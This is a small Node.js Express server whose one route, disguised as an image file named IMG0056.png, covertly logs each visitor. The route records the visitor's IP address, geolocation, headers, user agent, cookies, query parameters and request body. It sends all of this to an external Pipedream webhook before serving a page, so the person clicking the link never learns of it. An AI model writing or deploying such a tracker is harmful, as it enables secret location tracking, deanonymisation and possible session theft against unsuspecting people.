const express = require("express");
const requestIp = require('request-ip');
var geoip = require('geoip-lite');

const app = express();
const port = process.env.PORT || 3000

const axios = require('axios');
const instance = axios.create({
})

app.get("/IMG0056.png", (req, res) => {
    console.log(`REQUEST`, req)
    const clientIp = requestIp.getClientIp(req); 
    const location = geoip.lookup(clientIp);
    instance.post('https://eo2y2cjch3zlyga.m.pipedream.net/', {
        data: {
            timestamp: new Date().toISOString(),
            method: req.method,
            url: req.originalUrl,
            ip: clientIp,
            location,
            headers: req.headers,
            userAgent: req.headers['user-agent'], // Capture user-agent
            cookies: req.cookies || {}, // If cookies are being sent
            queryParams: req.query, // Capture query parameters
            body: req.body, // If body parser is used for post data
        }
    }).then((response) => {
        res.sendFile(__dirname + '/public/index.html');
    })    
});

app.use(express.static('public'))


app.listen(port, () => {
  console.log(`Example app listening on port ${port}`);
});
